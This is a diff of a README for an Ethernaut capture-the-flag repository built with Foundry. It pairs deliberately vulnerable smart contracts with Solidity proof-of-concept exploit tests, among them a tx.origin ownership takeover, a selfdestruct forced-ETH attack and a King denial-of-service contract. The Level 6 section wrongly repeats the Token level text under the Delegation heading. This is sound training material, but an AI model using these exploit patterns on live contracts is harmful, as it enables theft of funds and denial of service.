@@ -1,26 +1,39 @@
-## Ethernaut CTF
-### Challenges
-- [01. Fallback](#Level01)
-- [02. Fallout](#Level02)
-- [03. Coin Flip](#Level03)
-- [04. Telephone](#Level04) 
-- [05. Token](#Level05)
-- [06. Delegation](#Level06)
-- [07. Force](#Level07)
-- [08. Vault](#Level08)
-- [09. King](#Level09)
-- [10. Re-entrancy](#Level10)
-- [11. Elevator](#Level11)
-- [12. Privacy](#Level12)
-- [13. Gatekeeper One](#Level13)
-- [14. Gatekeeper Two](#Level14)
-- [15. Naught Coin](#Level15)
+# 🔓 Ethernaut CTF - Foundry Edition
+
+A comprehensive collection of **Ethernaut security challenges** implemented and solved using **Foundry** (Solidity testing framework). This repository contains vulnerable smart contracts and their proof-of-concept (POC) exploits.
+
 ---
-### <a id='Level01'></a> Level 1: Fallback 👌
-> **You will beat this level if:** you claim ownership of the contract, you reduce its balance to 0.
-- **[CODE](/src/Fallback/Fallback.sol)**
-- **POC**
-```javascript
+
+## 📚 Table of Contents
+
+1. [Level 1: Fallback](#level-1-fallback)
+2. [Level 2: Fallout](#level-2-fallout)
+3. [Level 3: Coin Flip](#level-3-coin-flip)
+4. [Level 4: Telephone](#level-4-telephone)
+5. [Level 5: Token](#level-5-token)
+6. [Level 6: Delegation](#level-6-delegation)
+7. [Level 7: Force](#level-7-force)
+8. [Level 8: Vault](#level-8-vault)
+9. [Level 9: King](#level-9-king)
+10. [Level 10: Re-entrancy](#level-10-re-entrancy)
+11. [Level 11: Elevator](#level-11-elevator)
+12. [Level 12: Privacy](#level-12-privacy)
+13. [Level 13: Gatekeeper One](#level-13-gatekeeper-one)
+14. [Level 14: Gatekeeper Two](#level-14-gatekeeper-two)
+15. [Level 15: Naught Coin](#level-15-naught-coin)
+
+---
+
+## Level 1: Fallback
+> **Objective:** Claim ownership of the contract and reduce its balance to 0.
+
+**Challenge Files:**
+- [Vulnerable Contract](/src/Fallback/Fallback.sol)
+
+**Vulnerability:** Fallback function can be used to claim ownership by contributing and sending funds directly.
+
+**POC - Test Contract:**
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -64,13 +77,23 @@ contract FallbackTest is Test {
 }
 ```
 
+**Key Insights:**
+- Fallback functions execute when no function selector matches
+- Direct ETH transfers bypass function signatures
+- Proper access control is essential for sensitive operations
+
 ---
 
-### <a id='Level02'></a> Level 2: Fallout👌
-> **Claim ownership of the contract below to complete this level.**
-- **[CODE](/src/Fallout/Fallout.sol)**
-- **POC**
-```javascript
+## Level 2: Fallout
+> **Objective:** Claim ownership of the contract.
+
+**Challenge Files:**
+- [Vulnerable Contract](/src/Fallout/Fallout.sol)
+
+**Vulnerability:** Constructor named `Fal1out` instead of `Fallout` - can be called by anyone!
+
+**POC - Test Contract:**
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -113,20 +136,45 @@ contract FalloutTest is Test {
 
 }
 ```
+
+**Key Insights:**
+- Typos in constructor names bypass initialization logic
+- Be extremely careful with function naming in Solidity
+- Always use compiler warnings to catch unintended behavior
 ---
 
-### <a id='Level04'></a> Level 4: Telephone👌
-> **Claim ownership of the contract below to complete this level.**
-- **[CODE](/src/Telephone/Telephone.sol)**
-- **POC**
-```javascript
+## Level 3: Coin Flip
+
+> **Objective:** Predict coin flip outcomes to win 10 consecutive times.
+
+**Challenge Files:**
+- [Vulnerable Contract](/src/Coin/Coin.sol)
+
+**Vulnerability:** Randomness derived from `blockhash()` - predictable and can be manipulated.
+
+**POC:** *(To be documented)*
+
+---
+
+## Level 4: Telephone
+> **Objective:** Claim ownership of the contract.
+
+**Challenge Files:**
+- [Vulnerable Contract](/src/Telephone/Telephone.sol)
+
+**Vulnerability:** `tx.origin` vs `msg.sender` confusion - attacker can call through intermediary contract.
+
+**POC - Test Contract:**
+```solidity
 pragma solidity ^0.8.0;
 
 import {Test,console} from "forge-std/Test.sol";
 import {Telephone} from "../src/Telephone/Telephone.sol";
+
 contract TelephoneTest is Test {
     Telephone telephone;
     Exploit exploit;
+    
     function setUp() public {
         telephone = new Telephone();
         exploit = new Exploit(address(telephone));
@@ -143,7 +191,6 @@ contract TelephoneTest is Test {
     }
 }
 
-
 contract Exploit {
     Telephone telephone;
 
@@ -155,32 +202,53 @@ contract Exploit {
         telephone.changeOwner(msg.sender);
     }
 }
-
 ```
+
+**Key Insights:**
+- `tx.origin` = original transaction sender (can be EOA or contract)
+- `msg.sender` = immediate caller (contract address when called via intermediary)
+- Always use `msg.sender` for access control checks
 ---
 
-### <a id='Level05'></a> Level 5: Token👌
+## Level 5: Token
+
+> **Objective:** Get additional tokens beyond the initial 20 tokens.
+
+**Challenge Files:**
+- [Vulnerable Contract](/src/Token/Token.sol)
+
+**Vulnerability:** Integer underflow in transfer function (pre-Solidity 0.8 without SafeMath).
+
+**POC:** *(To be documented)*
+
+---
+
+## Level 6: Delegation
 > **You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.**
 - **[CODE](/src/Token/Token.sol)**
 - **POC**
 ```javascript
 
 ```
----
-
-### <a id='Level06'></a> Level 6: Delegation
-> **Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.**
-- **[CODE](/src/Delegation/Delegation.sol)**
+> **You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.**
+- **[CODE](/src/Token/Token.sol)**
 - **POC**
-```javascript
+```solidity
 
 ```
+
 ---
-### <a id='Level07'></a> Level 7: Force
-> **The goal of this level is to make the balance of the contract greater than zero.**
-- **[CODE](/src/Force/Force.sol)**
-- **POC**
-```javascript
+
+## Level 7: Force
+> **Objective:** Make the balance of the Force contract greater than zero.
+
+**Challenge Files:**
+- [Vulnerable Contract](/src/Force/Force.sol)
+
+**Vulnerability:** `selfdestruct()` bypasses contract receive/fallback - forces ETH transfer.
+
+**POC - Test Contract:**
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -195,7 +263,6 @@ contract ForceTest is Test {
     }
 
     function test_Force() public {
-        /** EXPLOIT START **/
         console.log("Balance before exploit:", address(force).balance);
         vm.deal(address(this), 1 ether);
         Exploit exploit = new Exploit{value: 1 ether}(payable(address(force)));
@@ -209,42 +276,56 @@ contract ForceTest is Test {
 contract Exploit {
     constructor(address payable _target) payable {
         selfdestruct(_target);
-        // @explain `selfdestruct` sends all Ether in this contract to the target address forcefully. If the target contract has no payable functions or fallback, receive functions, it still receives the Ether.
+        // selfdestruct sends all Ether in this contract to the target address forcefully
     }
 }
 ```
+
+**Key Insights:**
+- `selfdestruct()` forces ETH transfer even without payable functions
+- No receive/fallback can prevent `selfdestruct` transfers
+- Modern Solidity (0.8.18+) deprecates `selfdestruct` for security
 ---
 
-### <a id='Level08'></a> Level 8: Vault
-> **The goal of this level is to unlock the vault.**
-- **[CODE](/src/Vault/Vault.sol)**
-- **POC**
-```javascript
+## Level 8: Vault
 
-```
+> **Objective:** Unlock the vault.
+
+**Challenge Files:**
+- [Vulnerable Contract](/src/Vault/Vault.sol)
+
+**Vulnerability:** Private variables are not hidden - readable from blockchain state.
+
+**POC:** *(To be documented)*
+
 ---
-### <a id='Level09'></a> Level 9: King
-> **The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD.
-Such a fun game. Your goal is to break it.
-When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.**
-- **[CODE](/src/King/King.sol)**
-- **POC**
-```js
+
+## Level 9: King
+> **Objective:** Become king and prevent others from claiming kingship.
+
+**Challenge Files:**
+- [Vulnerable Contract](/src/King/King.sol)
+
+**Vulnerability:** Can trap kingship by rejecting ETH transfers with a contract that reverts on receive.
+
+**POC - Test Contract:**
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 import {King} from "../src/King/King.sol";
 import {Test, console} from "forge-std/Test.sol";
 
-contract  Testking is Test {
+contract TestKing is Test {
     King _king;
+    
     function setUp() public {
         _king = new King();
     }
 
     fallback() external payable {}
 
-    function test1()  public {
+    function test_attack() public {
         address user1 = address(0x123);
         address user2 = address(0x124);
         vm.deal(user1, 10 ether);
@@ -265,70 +346,134 @@ contract  Testking is Test {
         if (!(_king._king() == user2)) {
             console.log("Hacked successfully, Attacker is the King forever");
         } 
-
     }
 }
 
 contract Attacker {
     constructor(King _King) payable {
         (bool result,) = address(_King).call{value: msg.value}("");  
-        
+    }
+    
+    receive() external payable {
+        revert("King is trapped!");
     }
 }
 ```
+
+**Key Insights:**
+- Contracts can reject ETH transfers via `receive()` revert
+- Denying fund transfers can trap critical state
+- Always handle failed transfers gracefully
 ---
 
-### <a id='Level10'></a> Level 10: Re-entrancy
-> **The goal of this level is for you to steal all the funds from the contract.**
-- **[CODE](/src/Reentrancy/Reentrancy.sol)**
-```javascript
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.12;
+## Level 10: Re-entrancy
 
-import "openzeppelin-contracts-06/math/SafeMath.sol";
+> **Objective:** Steal all funds from the contract using reentrancy.
 
-contract Reentrance {
-    using SafeMath for uint256;
+**Challenge Files:**
+- [Vulnerable Contract](/src/Re-entrancy/Re-entrancy.sol)
 
-    mapping(address => uint256) public balances;
+**Vulnerability:** Withdrawal logic vulnerable to reentrancy attack - balance updated after transfer.
 
-    function donate(address _to) public payable {
-        balances[_to] = balances[_to].add(msg.value);
-    }
+**POC:** *(To be documented)*
 
-    function balanceOf(address _who) public view returns (uint256 balance) {
-        return balances[_who];
-    }
-
-    function withdraw(uint256 _amount) public {
-        if (balances[msg.sender] >= _amount) {
-            (bool result,) = msg.sender.call{value: _amount}("");
-            if (result) {
-                _amount;
-            }
-            balances[msg.sender] -= _amount;
-        }
-    }
-
-    receive() external payable {}
-}
-```
-**POC**
-```javascript
-
-```
 ---
 
-### <a id='Level11'></a> Level 11: Elevator
-### <a id='Level12'></a> Level 12: Privacy
-### <a id='Level13'></a> Level 13: Gatekeeper One
-### <a id='Level14'></a> Level 14: Gatekeeper Two
-### <a id='Level15'></a> Level 15: Naught Coin
+## Level 11: Elevator
 
+> **Challenge Files:**
+- [Vulnerable Contract](/src/Elevator/Elevator.sol)
 
+**Vulnerability:** *(To be documented)*
 
+---
 
+## Level 12: Privacy
 
+> **Challenge Files:**
+- [Vulnerable Contract](/src/Privacy/Privacy.sol)
+
+**Vulnerability:** Private storage variables can be read from blockchain state.
+
+---
+
+## Level 13: Gatekeeper One
+
+> **Challenge Files:**
+- [Vulnerable Contract](/src/Gatekepper\ One/Gatekepper.sol)
+
+**Vulnerability:** Gate checks can be bypassed with proper address encoding.
+
+---
+
+## Level 14: Gatekeeper Two
+
+> **Challenge Files:**
+- [Vulnerable Contract](/src/Gatekepper\ Two/Gatekepper.sol)
+
+**Vulnerability:** *(To be documented)*
+
+---
+
+## Level 15: Naught Coin
+
+> **Challenge Files:**
+- [Vulnerable Contract](/src/Naught\ Coin/NaughtCoin.sol)
+
+**Vulnerability:** Approving tokens allows third parties to transfer on behalf of owner.
+
+---
+
+## 🛠️ Setup & Usage
+
+### Prerequisites
+- [Foundry](https://book.getfoundry.sh/) installed
+- Solidity knowledge
+
+### Installation
+```bash
+git clone <this-repo>
+cd EthernautCTF-Foundry
+forge install
+```
+
+### Running Tests
+```bash
+# Run all tests
+forge test
+
+# Run specific level
+forge test --match-path "**/Fallback*"
+
+# Verbose output
+forge test -vv
+```
+
+### Building
+```bash
+forge build
+```
+
+---
+
+## 📚 Learning Resources
+
+- [Ethernaut Official](https://ethernaut.openzeppelin.com/)
+- [Solidity Documentation](https://docs.soliditylang.org/)
+- [OpenZeppelin Contracts](https://github.com/OpenZeppelin/openzeppelin-contracts)
+- [Foundry Book](https://book.getfoundry.sh/)
+
+---
+
+## ⚠️ Disclaimer
+
+This repository is for **educational purposes only**. These are intentionally vulnerable smart contracts. Never use these patterns in production code.
+
+---
+
+## 📄 License
+
+MIT License
 
 
 
